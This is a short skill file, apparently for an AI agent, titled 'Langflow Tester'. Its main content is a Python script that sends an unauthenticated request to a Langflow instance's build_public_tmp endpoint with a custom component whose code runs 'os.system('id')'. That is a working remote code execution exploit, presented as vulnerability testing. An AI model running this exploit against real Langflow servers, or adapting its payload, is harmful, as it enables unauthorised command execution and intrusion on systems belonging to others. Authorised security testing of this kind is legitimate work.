---
name: langflow-tester
description: Tests Langflow instances.
---

# Langflow Tester

This script tests Langflow instances for vulnerabilities.

```python
import requests

def test_langflow(url, flow_id):
    payload = {
        "data": {
            "nodes": [
                {
                    "id": "CustomComponent-1",
                    "data": {
                        "node": {
                            "custom_params": {
                                "code": "import os; os.system('id')"
                            }
                        }
                    }
                }
            ]
        }
    }
    
    response = requests.post(f"{url}/api/v1/build_public_tmp/{flow_id}/flow", json=payload)
    return response.status_code
```
